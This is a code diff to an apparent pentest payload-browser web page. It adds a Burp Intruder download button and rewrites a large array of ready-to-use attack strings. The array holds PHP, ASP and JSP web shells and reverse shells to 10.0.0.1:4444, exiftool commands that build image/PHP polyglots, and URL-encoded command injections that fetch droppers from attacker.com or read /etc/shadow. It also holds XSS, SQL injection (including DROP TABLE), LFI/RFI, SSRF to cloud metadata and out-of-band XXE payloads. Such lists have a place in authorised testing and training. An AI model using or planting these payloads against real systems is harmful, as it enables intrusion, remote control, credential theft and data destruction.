@@ -41,6 +41,13 @@
   .count{font-family:var(--mono);font-size:12px;color:var(--muted);white-space:nowrap}
   .count b{color:var(--accent)}
 
+  /* Download button (new) */
+  .dl-btn{background:var(--accent-dim);border:1px solid var(--accent);color:#fff;
+    font-family:var(--mono);font-size:12px;padding:8px 12px;border-radius:8px;cursor:pointer;
+    white-space:nowrap;transition:.12s;display:inline-flex;align-items:center;gap:6px}
+  .dl-btn:hover{background:var(--accent);border-color:var(--accent);color:#fff}
+  .dl-btn:active{transform:translateY(1px)}
+
   /* Layout */
   .layout{display:grid;grid-template-columns:230px 1fr;gap:0;max-width:1200px;margin:0 auto;
     align-items:start}
@@ -105,6 +112,7 @@
     .scrim{position:fixed;inset:0;background:#000a;z-index:39;display:none}
     .scrim.show{display:block}
     .count{display:none}
+    .dl-btn{padding:8px 10px;font-size:11px}
   }
   nav.side::-webkit-scrollbar,pre.code::-webkit-scrollbar{height:8px;width:8px}
   nav.side::-webkit-scrollbar-thumb,pre.code::-webkit-scrollbar-thumb{background:var(--border);border-radius:8px}
@@ -132,6 +140,9 @@
         autocomplete="off" spellcheck="false" aria-label="Search payloads">
     </div>
     <div class="count"><b id="shown">0</b> / <span id="total">0</span> payloads</div>
+    <button class="dl-btn" id="dlBtn" title="Download currently visible payloads as .txt for Burp Intruder">
+      &#11015; Download
+    </button>
   </div>
 </header>
 
@@ -156,25 +167,605 @@
 <div class="toast" id="toast">Copied to clipboard</div>
 
 <script>
-const PAYLOADS = [{"id": 1, "category": "Upload Insecure Files", "subcategory": "PHP Extensions", "payload": ".php .php3 .php4 .php5 .php7 .pht .phps .phar .phpt .pgif .phtml .phtm .inc", "description": "Default PHP extensions that may be parsed and executed by the server."}, {"id": 2, "category": "Upload Insecure Files", "subcategory": "ASP Extensions", "payload": ".asp .aspx .config .cer .asa shell.aspx;1.jpg shell.soap", "description": "ASP / ASP.NET extensions and semicolon tricks for IIS parsing quirks."}, {"id": 3, "category": "Upload Insecure Files", "subcategory": "JSP Extensions", "payload": ".jsp .jspx .jsw .jsv .jspf .wss .do .actions", "description": "JSP-family extensions that map to servlet execution."}, {"id": 4, "category": "Upload Insecure Files", "subcategory": "Perl Extensions", "payload": ".pl .pm .cgi .lib", "description": "Perl / CGI extensions that may be executed under mod_cgi."}, {"id": 5, "category": "Upload Insecure Files", "subcategory": "Coldfusion Extensions", "payload": ".cfm .cfml .cfc .dbm", "description": "Coldfusion source extensions that execute server-side."}, {"id": 6, "category": "Upload Insecure Files", "subcategory": "Node.js Extensions", "payload": ".js .json .node", "description": "Node.js-related extensions relevant on misconfigured static handlers."}, {"id": 7, "category": "Upload Insecure Files", "subcategory": "Abusable File Types", "payload": ".svg -> XXE/XSS/SSRF | .gif -> XSS | .csv -> CSV Injection | .xml -> XXE | .avi -> LFI/SSRF | .zip -> RCE/DOS | .html -> XSS/Open Redirect", "description": "Non-executable file types that carry their own injection classes."}, {"id": 8, "category": "Upload Insecure Files", "subcategory": "Double Extension", "payload": "shell.jpg.php  shell.png.php5", "description": "Trailing executable extension after an allowed one; bypasses naive suffix checks."}, {"id": 9, "category": "Upload Insecure Files", "subcategory": "Reverse Double Extension", "payload": "shell.php.jpg", "description": "Executable extension first; abuses misconfigured Apache AddHandler ordering."}, {"id": 10, "category": "Upload Insecure Files", "subcategory": "Random Case", "payload": "shell.pHp  shell.pHP5  shell.PhAr", "description": "Mixed-case extension to defeat case-sensitive blacklists."}, {"id": 11, "category": "Upload Insecure Files", "subcategory": "Null Byte", "payload": "shell.php%00.gif  shell.php%00.png  shell.php%00.jpg", "description": "Null byte terminates the string before the image suffix on vulnerable parsers."}, {"id": 12, "category": "Upload Insecure Files", "subcategory": "Special Characters", "payload": "file.php......   file.php%20   file.php%0a   file.php/   file.php.\\", "description": "Trailing dots/space/newline/slash stripped after the extension check."}, {"id": 13, "category": "Upload Insecure Files", "subcategory": "Right-to-Left Override (RTLO)", "payload": "name.%E2%80%AEphp.jpg", "description": "Unicode RTLO character reverses the visible filename so 'php.jpg' displays as 'gpj.php'."}, {"id": 14, "category": "Upload Insecure Files", "subcategory": "Magic Bytes - PNG", "payload": "\\x89PNG\\r\\n\\x1a\\n\\0\\0\\0\\rIHDR", "description": "PNG file signature to prepend so content-sniffing accepts the upload as an image."}, {"id": 15, "category": "Upload Insecure Files", "subcategory": "Magic Bytes - JPG", "payload": "\\xff\\xd8\\xff", "description": "JPEG file signature (SOI marker) for content-type sniffing bypass."}, {"id": 16, "category": "Upload Insecure Files", "subcategory": "Magic Bytes - GIF", "payload": "GIF87a    GIF8;", "description": "GIF header prefix; commonly combined with a script payload for a polyglot."}, {"id": 17, "category": "Upload Insecure Files", "subcategory": "MIME Type Spoofing", "payload": "Content-Type: image/gif    image/png    image/jpeg", "description": "Set an image MIME type in the multipart upload to bypass Content-Type validation."}, {"id": 18, "category": "Upload Insecure Files", "subcategory": ".htaccess Override", "payload": "AddType application/x-httpd-php .png", "description": "Upload a .htaccess that re-maps an allowed extension to the PHP handler."}, {"id": 19, "category": "PHP Web Shells", "subcategory": "system() GET", "payload": "<?php system($_GET['cmd']); ?>", "description": "Minimal command execution via GET parameter."}, {"id": 20, "category": "PHP Web Shells", "subcategory": "bash reverse (exec)", "payload": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\"); ?>", "description": "Spawns an interactive reverse shell to the listener IP/port."}, {"id": 21, "category": "PHP Web Shells", "subcategory": "mkfifo reverse (nc)", "payload": "<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f\"); ?>", "description": "Named-pipe reverse shell for netcat without -e support."}, {"id": 22, "category": "PHP Web Shells", "subcategory": "fsockopen reverse", "payload": "<?php $sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>", "description": "Opens a socket and dups it onto the shell's fds."}, {"id": 23, "category": "PHP Web Shells", "subcategory": "shell_exec() GET", "payload": "<?php echo shell_exec($_GET['cmd']); ?>", "description": "Returns command output to the response body."}, {"id": 24, "category": "PHP Web Shells", "subcategory": "passthru() GET", "payload": "<?php passthru($_GET['cmd']); ?>", "description": "Passes raw command output straight through."}, {"id": 25, "category": "PHP Web Shells", "subcategory": "system() POST", "payload": "<?php system($_POST['cmd']); ?>", "description": "POST variant to keep commands out of access logs/URL."}, {"id": 26, "category": "PHP Web Shells", "subcategory": "eval() POST", "payload": "<?php eval($_POST['cmd']); ?>", "description": "Evaluates arbitrary PHP supplied via POST."}, {"id": 27, "category": "PHP Web Shells", "subcategory": "dropper", "payload": "<?php file_put_contents('shell.php', '<?php system($_GET[\"c\"]); ?>'); ?>", "description": "Writes a second-stage shell to disk."}, {"id": 28, "category": "Web Shells (One-liners)", "subcategory": "PHP", "payload": "<?php system($_GET['cmd']); ?>", "description": "PHP one-liner command execution."}, {"id": 29, "category": "Web Shells (One-liners)", "subcategory": "ASP", "payload": "<% eval request(\"cmd\") %>", "description": "Classic ASP one-liner."}, {"id": 30, "category": "Web Shells (One-liners)", "subcategory": "ASP.NET", "payload": "<%= System.Diagnostics.Process.Start(Request[\"cmd\"]) %>", "description": "ASP.NET process spawn one-liner."}, {"id": 31, "category": "Web Shells (One-liners)", "subcategory": "JSP", "payload": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "description": "JSP runtime exec one-liner."}, {"id": 32, "category": "Polyglot Payloads", "subcategory": "GIF89a + PHP", "payload": "GIF89a;<?php system($_GET['cmd']); ?>", "description": "Valid GIF magic header followed by PHP; passes image sniffing yet executes."}, {"id": 33, "category": "Polyglot Payloads", "subcategory": "JPEG + PHP (exiftool)", "payload": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.jpg", "description": "Embeds PHP in the JPEG comment field via exiftool."}, {"id": 34, "category": "Polyglot Payloads", "subcategory": "PNG + PHP (exiftool)", "payload": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.png -o shell.png", "description": "Embeds PHP in a PNG metadata chunk."}, {"id": 35, "category": "Polyglot Payloads", "subcategory": "Multiple metadata tags", "payload": "exiftool -Artist='<?php system($_GET[\"cmd\"]); ?>' -Copyright='payload' -ImageUniqueID='payload' image.jpg", "description": "Spreads the payload across several metadata fields to survive stripping of one."}, {"id": 36, "category": "Command Injection", "subcategory": "Semicolon", "payload": "; ls -la", "description": "Command separator on *nix shells."}, {"id": 37, "category": "Command Injection", "subcategory": "Pipe", "payload": "| whoami", "description": "Pipes previous output into the injected command."}, {"id": 38, "category": "Command Injection", "subcategory": "Background/AND", "payload": "& id", "description": "Runs the injected command alongside the original."}, {"id": 39, "category": "Command Injection", "subcategory": "Subshell $()", "payload": "$(cat /etc/passwd)", "description": "Command substitution."}, {"id": 40, "category": "Command Injection", "subcategory": "Backticks", "payload": "`cat /etc/passwd`", "description": "Legacy command substitution."}, {"id": 41, "category": "Command Injection", "subcategory": "Netcat reverse", "payload": "; nc -e /bin/sh 10.0.0.1 4444", "description": "Reverse shell where nc supports -e."}, {"id": 42, "category": "Command Injection", "subcategory": "Bash /dev/tcp reverse", "payload": "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "description": "Bash built-in reverse shell."}, {"id": 43, "category": "Command Injection", "subcategory": "Newline / CR", "payload": "%0a    %0d", "description": "URL-encoded newline / carriage return to break out of the command context."}, {"id": 44, "category": "Command Injection", "subcategory": "URL-encoded", "payload": "%3B%20ls%20-la", "description": "URL-encoded form of '; ls -la'."}, {"id": 45, "category": "Cross-Site Scripting (XSS)", "subcategory": "Basic script", "payload": "<script>alert('XSS')<\/script>", "description": "Canonical reflected/stored XSS probe."}, {"id": 46, "category": "Cross-Site Scripting (XSS)", "subcategory": "img onerror", "payload": "<img src=x onerror=alert(1)>", "description": "Fires on broken image load; survives many filters."}, {"id": 47, "category": "Cross-Site Scripting (XSS)", "subcategory": "svg onload", "payload": "<svg onload=alert(1)>", "description": "Executes on SVG load."}, {"id": 48, "category": "Cross-Site Scripting (XSS)", "subcategory": "body onload", "payload": "<body onload=alert(1)>", "description": "Event handler on injected body tag."}, {"id": 49, "category": "Cross-Site Scripting (XSS)", "subcategory": "javascript URI", "payload": "javascript:alert('XSS')", "description": "For href/src sinks that accept URIs."}, {"id": 50, "category": "Cross-Site Scripting (XSS)", "subcategory": "Attribute breakout", "payload": "\"><script>alert(1)<\/script>", "description": "Breaks out of an HTML attribute value."}, {"id": 51, "category": "Cross-Site Scripting (XSS)", "subcategory": "Filter-evasion polyglot", "payload": "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//--><\/SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))<\/SCRIPT>", "description": "Multi-context breakout string covering quoted JS, HTML and script contexts."}, {"id": 52, "category": "SQL Injection", "subcategory": "Auth bypass", "payload": "' OR '1'='1", "description": "Always-true condition to bypass a WHERE clause."}, {"id": 53, "category": "SQL Injection", "subcategory": "Comment login", "payload": "admin' --", "description": "Comments out the password check after the username."}, {"id": 54, "category": "SQL Injection", "subcategory": "UNION null probe", "payload": "' UNION SELECT NULL--", "description": "Probe for column count in a UNION-based injection."}, {"id": 55, "category": "SQL Injection", "subcategory": "UNION data extraction", "payload": "' UNION SELECT username, password FROM users--", "description": "Extracts credentials once column count/types align."}, {"id": 56, "category": "SQL Injection", "subcategory": "Error-based", "payload": "' AND 1=CONVERT(int, @@version)--", "description": "MSSQL type-cast error leaks the version string."}, {"id": 57, "category": "SQL Injection", "subcategory": "Time-based blind", "payload": "' AND SLEEP(5)--", "description": "MySQL boolean-blind confirmation via response delay."}, {"id": 58, "category": "SQL Injection", "subcategory": "Stacked query", "payload": "'; DROP TABLE users--", "description": "Stacked-query DDL (destructive - lab use only)."}, {"id": 59, "category": "File Inclusion (LFI/RFI)", "subcategory": "LFI - passwd", "payload": "../../../../etc/passwd", "description": "Classic *nix local file read."}, {"id": 60, "category": "File Inclusion (LFI/RFI)", "subcategory": "LFI - win.ini", "payload": "../../../../windows/win.ini", "description": "Windows LFI target for confirmation."}, {"id": 61, "category": "File Inclusion (LFI/RFI)", "subcategory": "php filter wrapper", "payload": "php://filter/convert.base64-encode/resource=index.php", "description": "Reads source of a PHP file as base64."}, {"id": 62, "category": "File Inclusion (LFI/RFI)", "subcategory": "data wrapper", "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", "description": "Inline base64-encoded PHP web shell via data:// wrapper."}, {"id": 63, "category": "File Inclusion (LFI/RFI)", "subcategory": "RFI", "payload": "http://attacker.com/shell.txt", "description": "Remote file inclusion when allow_url_include is on."}, {"id": 64, "category": "Server-Side Request Forgery (SSRF)", "subcategory": "AWS metadata", "payload": "http://169.254.169.254/latest/meta-data/", "description": "Cloud instance metadata endpoint (IAM creds, etc.)."}, {"id": 65, "category": "Server-Side Request Forgery (SSRF)", "subcategory": "Localhost admin", "payload": "http://127.0.0.1:8080/admin", "description": "Reach internal-only services bound to loopback."}, {"id": 66, "category": "Server-Side Request Forgery (SSRF)", "subcategory": "file scheme", "payload": "file:///etc/passwd", "description": "Local file read via file:// where the fetcher allows it."}, {"id": 67, "category": "Server-Side Request Forgery (SSRF)", "subcategory": "gopher smuggling", "payload": "gopher://localhost:8080/_GET /admin HTTP/1.0%0d%0a", "description": "Smuggle raw bytes to internal services via gopher."}, {"id": 68, "category": "Server-Side Request Forgery (SSRF)", "subcategory": "dict scheme", "payload": "dict://localhost:11211/stat", "description": "Interact with memcached/other line protocols via dict://."}, {"id": 69, "category": "XML External Entity (XXE)", "subcategory": "Classic file read", "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;<\/root>", "description": "In-band XXE reading a local file into the response."}, {"id": 70, "category": "XML External Entity (XXE)", "subcategory": "OOB parameter entity", "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">%remote;]>", "description": "Loads an external DTD for out-of-band / blind exfiltration."}, {"id": 71, "category": "XML External Entity (XXE)", "subcategory": "Billion Laughs (DoS)", "payload": "<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">", "description": "Entity-expansion denial of service (lab use only)."}, {"id": 72, "category": "Deserialization", "subcategory": "PHP object", "payload": "O:4:\"User\":1:{s:4:\"name\";s:4:\"admin\";}", "description": "Serialized PHP object; mutate properties to abuse magic methods."}, {"id": 73, "category": "Deserialization", "subcategory": "Java stream magic", "payload": "AC ED 00 05   (hex)    rO0ABXNy...  (base64)", "description": "Java serialized-stream signature markers to recognise/craft gadget chains."}, {"id": 74, "category": "Deserialization", "subcategory": "Python pickle", "payload": "cos\\nsystem\\n(S'whoami'\\ntR.", "description": "Pickle opcode stream invoking os.system on load."}, {"id": 75, "category": "Deserialization", "subcategory": ".NET ViewState", "payload": "/wEPDwUJ...", "description": "MAC-less ViewState is a common .NET deserialization sink."}, {"id": 76, "category": "Path Traversal", "subcategory": "Deep traversal", "payload": "../../../../../../etc/passwd", "description": "Over-long traversal to reach filesystem root reliably."}, {"id": 77, "category": "Path Traversal", "subcategory": "Windows traversal", "payload": "..\\..\\..\\..\\windows\\win.ini", "description": "Backslash traversal for Windows targets."}, {"id": 78, "category": "Path Traversal", "subcategory": "Nested bypass", "payload": "....//....//....//etc/passwd", "description": "Defeats a single non-recursive '../' strip."}, {"id": 79, "category": "Path Traversal", "subcategory": "URL-encoded", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "description": "Percent-encoded '../../../etc/passwd'."}, {"id": 80, "category": "Path Traversal", "subcategory": "Semicolon path", "payload": "..;/..;/..;/etc/passwd", "description": "Tomcat/Java path-parameter traversal trick."}, {"id": 81, "category": "Exiftool Commands", "subcategory": "Inject PHP comment", "payload": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg", "description": "Write a PHP payload into the JPEG comment tag."}, {"id": 82, "category": "Exiftool Commands", "subcategory": "Multi-tag payload", "payload": "exiftool -Copyright='Payload' -Artist='Pentest' image.jpg", "description": "Populate multiple metadata fields."}, {"id": 83, "category": "Exiftool Commands", "subcategory": "Strip all metadata", "payload": "exiftool -all= image.jpg", "description": "Remove all metadata (cleanup / OPSEC)."}, {"id": 84, "category": "Exiftool Commands", "subcategory": "Extract thumbnail", "payload": "exiftool -b -ThumbnailImage image.jpg > thumbnail.jpg", "description": "Dump an embedded thumbnail (can hide data)."}, {"id": 85, "category": "Exiftool Commands", "subcategory": "Verbose dump", "payload": "exiftool -v image.jpg", "description": "Verbose metadata inspection."}];
-const CATEGORIES = ["Upload Insecure Files", "PHP Web Shells", "Web Shells (One-liners)", "Polyglot Payloads", "Command Injection", "Cross-Site Scripting (XSS)", "SQL Injection", "File Inclusion (LFI/RFI)", "Server-Side Request Forgery (SSRF)", "XML External Entity (XXE)", "Deserialization", "Path Traversal", "Exiftool Commands"];
+const PAYLOADS = [
+/* ============================================================
+   UPLOAD INSECURE FILES
+   ============================================================ */
+{"id":1,"category":"Upload Insecure Files","subcategory":"PHP Extensions","payload":".php .php3 .php4 .php5 .php7 .pht .phps .phar .phpt .pgif .phtml .phtm .inc","description":"Default PHP extensions that may be parsed and executed by the server."},
+{"id":2,"category":"Upload Insecure Files","subcategory":"ASP Extensions","payload":".asp .aspx .config .cer .asa shell.aspx;1.jpg shell.soap","description":"ASP / ASP.NET extensions and semicolon tricks for IIS parsing quirks."},
+{"id":3,"category":"Upload Insecure Files","subcategory":"JSP Extensions","payload":".jsp .jspx .jsw .jsv .jspf .wss .do .actions","description":"JSP-family extensions that map to servlet execution."},
+{"id":4,"category":"Upload Insecure Files","subcategory":"Perl Extensions","payload":".pl .pm .cgi .lib","description":"Perl / CGI extensions that may be executed under mod_cgi."},
+{"id":5,"category":"Upload Insecure Files","subcategory":"Coldfusion Extensions","payload":".cfm .cfml .cfc .dbm","description":"Coldfusion source extensions that execute server-side."},
+{"id":6,"category":"Upload Insecure Files","subcategory":"Node.js Extensions","payload":".js .json .node","description":"Node.js-related extensions relevant on misconfigured static handlers."},
+{"id":7,"category":"Upload Insecure Files","subcategory":"Abusable File Types","payload":".svg -> XXE/XSS/SSRF | .gif -> XSS | .csv -> CSV Injection | .xml -> XXE | .avi -> LFI/SSRF | .zip -> RCE/DOS | .html -> XSS/Open Redirect","description":"Non-executable file types that carry their own injection classes."},
+{"id":8,"category":"Upload Insecure Files","subcategory":"Double Extension","payload":"shell.jpg.php  shell.png.php5","description":"Trailing executable extension after an allowed one; bypasses naive suffix checks."},
+{"id":9,"category":"Upload Insecure Files","subcategory":"Reverse Double Extension","payload":"shell.php.jpg","description":"Executable extension first; abuses misconfigured Apache AddHandler ordering."},
+{"id":10,"category":"Upload Insecure Files","subcategory":"Random Case","payload":"shell.pHp  shell.pHP5  shell.PhAr","description":"Mixed-case extension to defeat case-sensitive blacklists."},
+{"id":11,"category":"Upload Insecure Files","subcategory":"Null Byte","payload":"shell.php%00.gif  shell.php%00.png  shell.php%00.jpg","description":"Null byte terminates the string before the image suffix on vulnerable parsers."},
+{"id":12,"category":"Upload Insecure Files","subcategory":"Special Characters","payload":"file.php......   file.php%20   file.php%0a   file.php/   file.php.\\","description":"Trailing dots/space/newline/slash stripped after the extension check."},
+{"id":13,"category":"Upload Insecure Files","subcategory":"Right-to-Left Override (RTLO)","payload":"name.%E2%80%AEphp.jpg","description":"Unicode RTLO character reverses the visible filename so 'php.jpg' displays as 'gpj.php'."},
+{"id":14,"category":"Upload Insecure Files","subcategory":"Magic Bytes - PNG","payload":"\\x89PNG\\r\\n\\x1a\\n\\0\\0\\0\\rIHDR","description":"PNG file signature to prepend so content-sniffing accepts the upload as an image."},
+{"id":15,"category":"Upload Insecure Files","subcategory":"Magic Bytes - JPG","payload":"\\xff\\xd8\\xff","description":"JPEG file signature (SOI marker) for content-type sniffing bypass."},
+{"id":16,"category":"Upload Insecure Files","subcategory":"Magic Bytes - GIF","payload":"GIF87a    GIF8;","description":"GIF header prefix; commonly combined with a script payload for a polyglot."},
+{"id":17,"category":"Upload Insecure Files","subcategory":"MIME Type Spoofing","payload":"Content-Type: image/gif    image/png    image/jpeg","description":"Set an image MIME type in the multipart upload to bypass Content-Type validation."},
+{"id":18,"category":"Upload Insecure Files","subcategory":".htaccess Override","payload":"AddType application/x-httpd-php .png","description":"Upload a .htaccess that re-maps an allowed extension to the PHP handler."},
+
+/* ============================================================
+   PHP WEB SHELLS
+   ============================================================ */
+{"id":19,"category":"PHP Web Shells","subcategory":"system() GET","payload":"<?php system($_GET['cmd']); ?>","description":"Minimal command execution via GET parameter."},
+{"id":20,"category":"PHP Web Shells","subcategory":"bash reverse (exec)","payload":"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\"); ?>","description":"Spawns an interactive reverse shell to the listener IP/port."},
+{"id":21,"category":"PHP Web Shells","subcategory":"mkfifo reverse (nc)","payload":"<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f\"); ?>","description":"Named-pipe reverse shell for netcat without -e support."},
+{"id":22,"category":"PHP Web Shells","subcategory":"fsockopen reverse","payload":"<?php $sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>","description":"Opens a socket and dups it onto the shell's fds."},
+{"id":23,"category":"PHP Web Shells","subcategory":"shell_exec() GET","payload":"<?php echo shell_exec($_GET['cmd']); ?>","description":"Returns command output to the response body."},
+{"id":24,"category":"PHP Web Shells","subcategory":"passthru() GET","payload":"<?php passthru($_GET['cmd']); ?>","description":"Passes raw command output straight through."},
+{"id":25,"category":"PHP Web Shells","subcategory":"system() POST","payload":"<?php system($_POST['cmd']); ?>","description":"POST variant to keep commands out of access logs/URL."},
+{"id":26,"category":"PHP Web Shells","subcategory":"eval() POST","payload":"<?php eval($_POST['cmd']); ?>","description":"Evaluates arbitrary PHP supplied via POST."},
+{"id":27,"category":"PHP Web Shells","subcategory":"dropper","payload":"<?php file_put_contents('shell.php', '<?php system($_GET[\"c\"]); ?>'); ?>","description":"Writes a second-stage shell to disk."},
+
+/* ============================================================
+   WEB SHELLS (ONE-LINERS)
+   ============================================================ */
+{"id":28,"category":"Web Shells (One-liners)","subcategory":"PHP","payload":"<?php system($_GET['cmd']); ?>","description":"PHP one-liner command execution."},
+{"id":29,"category":"Web Shells (One-liners)","subcategory":"ASP","payload":"<% eval request(\"cmd\") %>","description":"Classic ASP one-liner."},
+{"id":30,"category":"Web Shells (One-liners)","subcategory":"ASP.NET","payload":"<%= System.Diagnostics.Process.Start(Request[\"cmd\"]) %>","description":"ASP.NET process spawn one-liner."},
+{"id":31,"category":"Web Shells (One-liners)","subcategory":"JSP","payload":"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>","description":"JSP runtime exec one-liner."},
+
+/* ============================================================
+   POLYGLOT PAYLOADS
+   ============================================================ */
+{"id":32,"category":"Polyglot Payloads","subcategory":"GIF89a + PHP","payload":"GIF89a;<?php system($_GET['cmd']); ?>","description":"Valid GIF magic header followed by PHP; passes image sniffing yet executes."},
+{"id":33,"category":"Polyglot Payloads","subcategory":"JPEG + PHP (exiftool)","payload":"exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.jpg","description":"Embeds PHP in the JPEG comment field via exiftool."},
+{"id":34,"category":"Polyglot Payloads","subcategory":"PNG + PHP (exiftool)","payload":"exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.png -o shell.png","description":"Embeds PHP in a PNG metadata chunk."},
+{"id":35,"category":"Polyglot Payloads","subcategory":"Multiple metadata tags","payload":"exiftool -Artist='<?php system($_GET[\"cmd\"]); ?>' -Copyright='payload' -ImageUniqueID='payload' image.jpg","description":"Spreads the payload across several metadata fields to survive stripping of one."},
+
+/* ============================================================
+   COMMAND INJECTION
+   ============================================================ */
+{"id":36,"category":"Command Injection","subcategory":"Semicolon","payload":"; ls -la","description":"Command separator on *nix shells."},
+{"id":37,"category":"Command Injection","subcategory":"Pipe","payload":"| whoami","description":"Pipes previous output into the injected command."},
+{"id":38,"category":"Command Injection","subcategory":"Background/AND","payload":"& id","description":"Runs the injected command alongside the original."},
+{"id":39,"category":"Command Injection","subcategory":"Subshell $()","payload":"$(cat /etc/passwd)","description":"Command substitution."},
+{"id":40,"category":"Command Injection","subcategory":"Backticks","payload":"`cat /etc/passwd`","description":"Legacy command substitution."},
+{"id":41,"category":"Command Injection","subcategory":"Netcat reverse","payload":"; nc -e /bin/sh 10.0.0.1 4444","description":"Reverse shell where nc supports -e."},
+{"id":42,"category":"Command Injection","subcategory":"Bash /dev/tcp reverse","payload":"; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1","description":"Bash built-in reverse shell."},
+{"id":43,"category":"Command Injection","subcategory":"Newline / CR","payload":"%0a    %0d","description":"URL-encoded newline / carriage return to break out of the command context."},
+{"id":44,"category":"Command Injection","subcategory":"URL-encoded","payload":"%3B%20ls%20-la","description":"URL-encoded form of '; ls -la'."},
+{"id":45,"category":"Command Injection","subcategory":"Encoded semicolon ls -la","payload":"%3B%20ls%20-la","description":"URL-encoded '; ls -la'."},
+{"id":46,"category":"Command Injection","subcategory":"Encoded semicolon whoami","payload":"%3B%20whoami","description":"URL-encoded '; whoami'."},
+{"id":47,"category":"Command Injection","subcategory":"Encoded semicolon id","payload":"%3B%20id","description":"URL-encoded '; id'."},
+{"id":48,"category":"Command Injection","subcategory":"Encoded semicolon pwd","payload":"%3B%20pwd","description":"URL-encoded '; pwd'."},
+{"id":49,"category":"Command Injection","subcategory":"Encoded uname -a","payload":"%3B%20uname%20-a","description":"URL-encoded '; uname -a'."},
+{"id":50,"category":"Command Injection","subcategory":"Encoded cat /etc/passwd","payload":"%3B%20cat%20%2Fetc%2Fpasswd","description":"URL-encoded '; cat /etc/passwd'."},
+{"id":51,"category":"Command Injection","subcategory":"Encoded cat /etc/shadow","payload":"%3B%20cat%20%2Fetc%2Fshadow","description":"URL-encoded '; cat /etc/shadow'."},
+{"id":52,"category":"Command Injection","subcategory":"Encoded cat /etc/hosts","payload":"%3B%20cat%20%2Fetc%2Fhosts","description":"URL-encoded '; cat /etc/hosts'."},
+{"id":53,"category":"Command Injection","subcategory":"Encoded wget dropper","payload":"%3B%20wget%20http%3A%2F%2Fattacker.com%2Fshell.sh","description":"URL-encoded wget to fetch a stage-2 payload."},
+{"id":54,"category":"Command Injection","subcategory":"Encoded curl dropper","payload":"%3B%20curl%20http%3A%2F%2Fattacker.com%2Fshell.sh","description":"URL-encoded curl to fetch a stage-2 payload."},
+{"id":55,"category":"Command Injection","subcategory":"Encoded nc reverse","payload":"%3B%20nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444","description":"URL-encoded nc -e reverse shell."},
+{"id":56,"category":"Command Injection","subcategory":"Encoded pipe whoami","payload":"%7C%20whoami","description":"URL-encoded '| whoami'."},
+{"id":57,"category":"Command Injection","subcategory":"Encoded pipe id","payload":"%7C%20id","description":"URL-encoded '| id'."},
+{"id":58,"category":"Command Injection","subcategory":"Encoded pipe ls -la","payload":"%7C%20ls%20-la","description":"URL-encoded '| ls -la'."},
+{"id":59,"category":"Command Injection","subcategory":"Encoded pipe cat passwd","payload":"%7C%20cat%20%2Fetc%2Fpasswd","description":"URL-encoded '| cat /etc/passwd'."},
+{"id":60,"category":"Command Injection","subcategory":"Encoded pipe nc reverse","payload":"%7C%20nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444","description":"URL-encoded '| nc -e /bin/sh ...'."},
+{"id":61,"category":"Command Injection","subcategory":"Encoded & id","payload":"%26%20id","description":"URL-encoded '& id'."},
+{"id":62,"category":"Command Injection","subcategory":"Encoded & whoami","payload":"%26%20whoami","description":"URL-encoded '& whoami'."},
+{"id":63,"category":"Command Injection","subcategory":"Encoded & ls -la","payload":"%26%20ls%20-la","description":"URL-encoded '& ls -la'."},
+{"id":64,"category":"Command Injection","subcategory":"Encoded & cat passwd","payload":"%26%20cat%20%2Fetc%2Fpasswd","description":"URL-encoded '& cat /etc/passwd'."},
+{"id":65,"category":"Command Injection","subcategory":"Encoded && id","payload":"%26%26%20id","description":"URL-encoded '&& id'."},
+{"id":66,"category":"Command Injection","subcategory":"Encoded && whoami","payload":"%26%26%20whoami","description":"URL-encoded '&& whoami'."},
+{"id":67,"category":"Command Injection","subcategory":"Encoded || id","payload":"%7C%7C%20id","description":"URL-encoded '|| id'."},
+{"id":68,"category":"Command Injection","subcategory":"Encoded || whoami","payload":"%7C%7C%20whoami","description":"URL-encoded '|| whoami'."},
+{"id":69,"category":"Command Injection","subcategory":"Encoded $(cat passwd)","payload":"%24%28cat%20%2Fetc%2Fpasswd%29","description":"URL-encoded '$(cat /etc/passwd)'."},
+{"id":70,"category":"Command Injection","subcategory":"Encoded $(whoami)","payload":"%24%28whoami%29","description":"URL-encoded '$(whoami)'."},
+{"id":71,"category":"Command Injection","subcategory":"Encoded $(id)","payload":"%24%28id%29","description":"URL-encoded '$(id)'."},
+{"id":72,"category":"Command Injection","subcategory":"Encoded $(ls -la)","payload":"%24%28ls%20-la%29","description":"URL-encoded '$(ls -la)'."},
+{"id":73,"category":"Command Injection","subcategory":"Encoded `cat /etc/passwd`","payload":"%60cat%20%2Fetc%2Fpasswd%60","description":"URL-encoded backtick substitution."},
